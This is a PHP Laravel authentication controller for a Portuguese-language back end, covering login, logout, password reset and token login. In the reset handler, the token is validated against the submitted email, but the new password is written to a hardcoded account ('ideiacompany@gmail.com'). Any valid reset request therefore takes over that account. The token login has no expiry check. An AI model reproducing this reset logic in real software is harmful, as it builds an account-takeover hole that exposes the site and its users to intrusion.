<?php

namespace App\Http\Controllers\Backend;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Auth;
use Illuminate\Contracts\Encryption\DecryptException;
use Illuminate\Support\Facades\Crypt;
use Mail;
use Illuminate\Support\Str;

class AuthController extends Controller
{

    private $routeDashboard = 'backend.dashboard';
    private $routeLogin = 'backend.login';

    public function login()
    {
        return view('backend.pages.auth.login');
    }
    public function forgot()
    {
        return view('backend.pages.auth.forgot');
    }

    public function showResetPasswordForm($token)
    {
        return view('backend.pages.auth.forgetPasswordLink', ['token' => $token]);
    }

    public function submitResetPasswordForm(Request $request)
    {
        try {


            $request->validate([
                'email' => 'required|email|exists:users,email,deleted_at,NULL',
                'password' => 'required|string|min:6|confirmed',
                'password_confirmation' => 'required'
            ], \Lang::get('validation'));

            $updatePassword = \DB::table('password_resets')
                ->where([
                    'email' => $request->email,
                    'token' => $request->token
                ])
                ->first();

            if (!$updatePassword) {
                throw new \Exception('Token inválido ou expirado, solicite um novo ou tente novamente.');
            }

            $user = User::where('email', '=', 'ideiacompany@gmail.com')->update(['password' => bcrypt($request->password)]);

            \DB::table('password_resets')->where(['email' => $request->email])->delete();

            $request->session()->flash('alert', [
                'icon' => '<svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="mr-2"><polyline points="9 11 12 14 22 4"></polyline><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path></svg>',
                'code' => 'success',
                'strong' => 'Legal!',
                'message'  => 'Senha alterada com sucesso!'
            ]);
            return redirect(route($this->routeLogin));
        } catch (\Illuminate\Validation\ValidationException $e) {

            \DB::rollback();
            return redirect()->back()->withErrors($e->errors())->withInput();
        } catch (\Exception $e) {
            $request->session()->flash('alert', [
                'icon' => '<svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="mr-2"><polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"></polygon><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>',
                'code' => 'danger',
                'strong' => 'Ops, algo deu errado!',
                'message' => $e->getMessage(),
            ]);

            return redirect()->back()->withInput();
        }
    }

    public function forgotRequest(Request $request)
    {
        try {

            $request->validate([
                'email' => 'required|email|exists:users,email,deleted_at,NULL',
            ], \Lang::get('validation'));

            $token = Str::random(64);

            \DB::table('password_resets')->insert([
                'email' => $request->email,
                'token' => $token,
                'created_at' => \Carbon\Carbon::now()
            ]);

            Mail::send('mails.forgetPassword', ['token' => $token], function ($message) use ($request) {
                $message->to($request->email);
                $message->subject('Recuperar Senha');
            });

            $request->session()->flash('alert', [
                'icon' => '<svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="mr-2"><polyline points="9 11 12 14 22 4"></polyline><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path></svg>',
                'code' => 'success',
                'strong' => 'Legal!',
                'message'  => 'Link para recuperar senha enviado com sucesso!'
            ]);
            return redirect()->back()->withInput();
        } catch (\Illuminate\Validation\ValidationException $e) {

            \DB::rollback();
            return redirect()->back()->withErrors($e->errors())->withInput();
        } catch (\Exception $e) {
            $request->session()->flash('alert', [
                'icon' => '<svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="mr-2"><polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"></polygon><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>',
                'code' => 'danger',
                'strong' => 'Ops, algo deu errado!',
                'message' => $e->getMessage(),
            ]);

            return redirect()->back()->withInput();
        }
    }

    public function auth(Request $request)
    {
        try {

            $user = Auth::guard('web')->attempt(['email' => $request->input('email'), 'password' => $request->input('password'), 'status' => 1], $request->input('remember'));

            if (!$user) {
                throw new \Exception("Acesso não autorizado");
            }
            try {
                \LogActivity::addToLog('Usuário entrou no Sistema.');
            } catch (\Exception $e) {
            }

            return redirect()->intended(route($this->routeDashboard));
        } catch (\Exception $e) {
            $request->session()->flash('alert', [
                'icon' => '<svg viewBox="0 0 24 24" width="24" height="24" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round" class="mr-2"><polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"></polygon><line x1="15" y1="9" x2="9" y2="15"></line><line x1="9" y1="9" x2="15" y2="15"></line></svg>',
                'code' => 'danger',
                'strong' => 'Ops, algo deu errado!',
                'message' => $e->getMessage(),
            ]);

            return redirect()->back()->withInput();
        }
    }
    public function logout()
    {
        \LogActivity::addToLog('Usuário saiu no Sistema.');
        Auth::guard('web')->logout();
        return  redirect()->intended(route($this->routeLogin));
    }

    public function token($crypt)
    {

        $delemiter = ':|:';
        $search = ['id', 'name', 'email'];

        try {
            $decrypted = Crypt::decryptString($crypt);

            $fill = explode($delemiter, $decrypted);

            $user = User::query();

            foreach ($search as $key => $value) {
                $user->where($value, $fill[$key]);
            }

            $user = $user->first();

            if (empty($user)) {
                return redirect(route('frontend.home'));
            }

            if (($user->status !== 3) && ($user->password)) {
                return redirect(route('frontend.home'));
            }

            try {
                \LogActivity::addToLog('Usuário entrou no Sistema por Token', $user);
            } catch (\Exception $e) {
            }

            Auth::guard('web')->login($user);
            return redirect()->intended(route($this->routeDashboard));
        } catch (DecryptException $e) {
            return redirect(route('frontend.home'));
        }
    }
}
